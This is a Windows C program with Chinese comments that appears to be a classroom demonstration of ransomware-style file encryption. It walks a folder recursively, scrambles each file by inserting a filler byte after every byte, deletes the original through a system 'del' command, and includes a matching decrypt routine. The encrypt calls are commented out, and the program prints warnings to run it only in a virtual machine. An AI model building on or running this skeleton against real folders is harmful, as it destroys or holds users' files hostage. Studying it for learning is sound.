#include <stdio.h>
#include <string.h>
#include <windows.h>
#include <stdlib.h>

//文件加密函数 参数-文件名字
void jiami(char* fileName, char* pathName)
{
	FILE* fp = NULL;                  //文件指针变量
	int size = 0;                     //文件大小

	//打开文件
	//注意： 使用二进制打开可以复制大型文件如.exe文件，音频视频文件等
	fp = fopen(fileName, "rb");       //打开可读写的文件
	if (NULL == fp) {
		printf("打开文件失败\n");
		return;
	}
	printf("打开 %s 文件成功!\n", fileName);

	//获取文件大小
	fseek(fp, 0, SEEK_END);                   //设置光标到文件末尾
	size = ftell(fp);                         //计算光标位置距离文件头字节数
	fseek(fp, 0, SEEK_SET);                   //设置光标位置到文件头
	printf("文件大小为：%d字节！\n", size);

	//获取文件所有内容
	char code = 'a';
	char ch;
	char temp[256];
	memset(temp, 0, 256);
	sprintf(temp, "%s\\%s", pathName, "test");
	printf("%s\n", temp);

	FILE* fpw = fopen(temp, "wb");         //写入文件
	while (!feof(fp)) { 
		ch = fgetc(fp);
		fputc(ch, fpw);
		fputc(code, fpw);
		//printf("%c\n", ch);
	}

	//保存关闭
	fclose(fp);
	fclose(fpw);

	//替换文件
	char commend[1024];
	memset(commend, 0, 1024);
	sprintf(commend, "del \"%s\"", fileName);     //访问路径包含空格增加双引号
	printf("%s\n", commend);
	system(commend);
	rename(temp, fileName);                       //调用C语言rename函数重命名文件
	printf("\n");
	return;
}

//文件解密函数 参数-文件名字
void jiemi(char* fileName, char* pathName)
{
	char ch;
	int size = 0;                        //文件大小
	FILE* fp;                           //打开文件
	FILE* fpw;                           //写入文件
	char tmp[1024];

	//初始化操作
	memset(tmp, 0, 1024);
	sprintf(tmp, "%s\\tmp", pathName);
	printf("%s\n", tmp);
	fp = fopen(fileName, "rb");
	fpw = fopen(tmp, "wb");
	fseek(fpw, 0, SEEK_SET);             //设置光标位置到文件头

	//每隔一个字节删除一个字节数据
	int i = 0;
	while (!feof(fp)) {
		ch = fgetc(fp);
		if (0 == (i % 2)) { //偶数写入
			i = 1;
			fputc(ch, fpw);
		}
		else {
			i = 0;
			continue;
		}
	}
	fclose(fp);
	fclose(fpw);

	//替换文件
	char commend[1024];
	memset(commend, 0, 1024);
	sprintf(commend, "del \"%s\"", fileName);     //访问路径包含空格增加双引号
	printf("%s\n", commend);
	system(commend);
	rename(tmp, fileName);                       //调用C语言rename函数重命名文件
	printf("\n");

	return;
}

//遍历文件夹找到每个文件 参数-文件夹名字
void findFile(char* pathName)
{
	/* 禁止加密他人计算机,一定只能对指定目录加密,尤其不能对C盘加密 */

	//1.设置要找的文件名 通配符实现
	char findFileName[256];
	memset(findFileName, 0, 256);                   //清空数组
	sprintf(findFileName, "%s\\*.*", pathName);
	printf("要找的文件名是：%s\n", findFileName);

	//2.获取目录下第一个文件
	WIN32_FIND_DATA findData;                    //定义结构体
	HANDLE hFile = FindFirstFile(findFileName, &findData);
	//判断返回值等于-1(INVALID_HANDLE_VALUE)
	if (INVALID_HANDLE_VALUE == hFile) {
		printf("查找文件失败!\n");
		return;
	}
	//如果成功进入死循环继续查找下一个文件
	else {
		int ret = 1;
		char temp[256];
		while (ret) {
			//如果找到的是个文件夹 则需要继续查找该文件夹内容
			if (findData.dwFileAttributes == FILE_ATTRIBUTE_DIRECTORY) {
				if(findData.cFileName[0] != '.') {
					//文件夹拼接=原始路径+新文件夹路径
					memset(temp, 0, 256);
					sprintf(temp, "%s\\%s", pathName, findData.cFileName);
					printf("找到一个文件夹：%s\n", temp);
					Sleep(1000);                             //暂停1秒钟
					findFile(temp);
				}
			}
			else { //如果是文件 则加密文件
				memset(temp, 0, 256);
				sprintf(temp, "%s\\%s", pathName, findData.cFileName);
				printf("找到一个文件：%s\n", temp);
				//加密文件
				//jiami(temp, pathName);

				//解密文件
				//jiemi(temp, pathName);
			}
			//查找下一个文件
			ret = FindNextFile(hFile, &findData);
		}
	}
	return;
}

int main()
{
	char buff[256] = { 0 };
	GetCurrentDirectory(256, buff);
	printf("提醒！！！！该代码一定在虚拟机中运行，并且对非系统盘指定文件夹加密\n");
	printf("提醒！！！！该代码一定在虚拟机中运行，并且对非系统盘指定文件夹加密\n");
	printf("提醒！！！！该代码一定在虚拟机中运行，并且对非系统盘指定文件夹加密\n");
	printf("当前目录是：%s\n\n", buff);

	//加密指定文件夹目录 建议使用虚拟机执行
	findFile("\..\\文件夹加密");

	return 0;
}
